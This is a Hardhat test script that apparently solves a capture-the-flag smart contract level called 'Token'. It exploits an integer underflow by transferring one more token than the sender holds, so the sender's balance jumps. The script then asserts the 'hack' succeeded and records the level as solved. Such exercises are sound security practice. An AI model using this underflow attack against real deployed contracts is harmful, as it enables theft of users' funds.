const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

describe("Token", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("Token");
    console.log(
      "deploying contract with initial balance of msg.sender and total supply of 20"
    );
    contract = await factory.deploy(deployer.address);
    await contract.deployed();
  });

  it("initiate hack", async () => {
    const balanceBefore = await contract.balanceOf(deployer.address);
    console.log("your initial token balance : ", balanceBefore);
    console.log("initiating hack!");
    console.log("calling transfer with value > balance to underflow");
    await contract
      .connect(deployer)
      .transfer(hacker.address, balanceBefore.add(1), { gasLimit: 3e6 });
    console.log(
      "Your new balance :",
      await contract.balanceOf(deployer.address)
    );
    expect(balanceBefore).to.be.lt(await contract.balanceOf(deployer.address));
    console.log("Hacked!!");
    util.updateTotalSolved(scriptName);
  });
});
